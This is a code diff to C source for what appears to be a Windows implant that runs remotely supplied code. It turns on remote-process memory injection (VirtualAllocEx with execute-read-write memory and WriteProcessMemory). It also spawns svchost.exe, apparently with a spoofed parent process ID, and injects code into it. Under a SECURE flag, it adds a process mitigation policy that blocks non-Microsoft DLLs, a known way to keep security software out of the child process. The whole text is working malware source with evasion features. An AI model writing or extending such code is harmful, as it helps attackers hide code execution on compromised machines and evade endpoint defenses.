@@ -65,6 +65,10 @@ HANDLE FindProcess(const char* process)
 
 BOOL InjectModule(CHAR* Bytes, DWORD Size)
 {
+    // 
+    // This function is not in use
+    // 
+
     PVOID rBuffer;
     HANDLE hProcess;
 
@@ -73,8 +77,8 @@ BOOL InjectModule(CHAR* Bytes, DWORD Size)
 
     printf("Injecting into pid: %d\n", GetProcessId(hProcess));
 
-    // rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    // WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);
+    rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 
@@ -166,9 +170,11 @@ BOOL InjectUserCode(CHAR* Bytes, SIZE_T Size)
     Run user supplied code and send all the output back to them
     */
     
+    DWORD pol;
     DWORD threadId;
     HANDLE tHandle;
     HANDLE hProcess;
+    SIZE_T tSize = 0;
     ULONG oProc, nProc;
 
     LPVOID rBuffer = NULL;
@@ -217,20 +223,20 @@ BOOL InjectUserCode(CHAR* Bytes, SIZE_T Size)
     }
 
     // define our startup info
-    STARTUPINFO sInfo;
+    STARTUPINFOEXA sInfo;
     BOOL bSuccess = FALSE;
     PROCESS_INFORMATION pInfo; 
 
     // zero out the structures
+    ZeroMemory( &sInfo, sizeof(sInfo) );
     ZeroMemory( &pInfo, sizeof(PROCESS_INFORMATION) );
-    ZeroMemory( &sInfo, sizeof(STARTUPINFO) );
 
     // change the std values to our pipes
-    sInfo.cb = sizeof(STARTUPINFO); 
-    sInfo.hStdError = g_hChildStd_OUT_Wr;
-    sInfo.hStdOutput = g_hChildStd_OUT_Wr;
-    sInfo.hStdInput = g_hChildStd_IN_Rd;
-    sInfo.dwFlags |= STARTF_USESTDHANDLES;
+    sInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA); 
+    sInfo.StartupInfo.hStdError = g_hChildStd_OUT_Wr;
+    sInfo.StartupInfo.hStdOutput = g_hChildStd_OUT_Wr;
+    sInfo.StartupInfo.hStdInput = g_hChildStd_IN_Rd;
+    sInfo.StartupInfo.dwFlags = STARTF_USESTDHANDLES | EXTENDED_STARTUPINFO_PRESENT;
 
     // get the os info so we can use the correct syscall number
     RtlGetVersion(&osInfo);
@@ -238,8 +244,26 @@ BOOL InjectUserCode(CHAR* Bytes, SIZE_T Size)
     // start the thread to read from the stdout pipe
     CreateThread(NULL, 0, ReadFromPipe, g_hChildStd_OUT_Rd, 0, &threadId);
 
+    #ifdef SECURE
+        DEBUG("Creating secure process");
+
+        // get the size of the list
+        InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &tSize);
+
+        // alloc the memory for it
+        sInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(tSize);
+
+        // now put the attributes in
+        InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &tSize);
+
+        DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+
+        // now update our attributes
+        UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
+    #endif
+
     // spawn svchost.exe with a different ppid an jus start it running
-    CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
+    CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);
 
     // alloc the memory we need inside the process
     rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
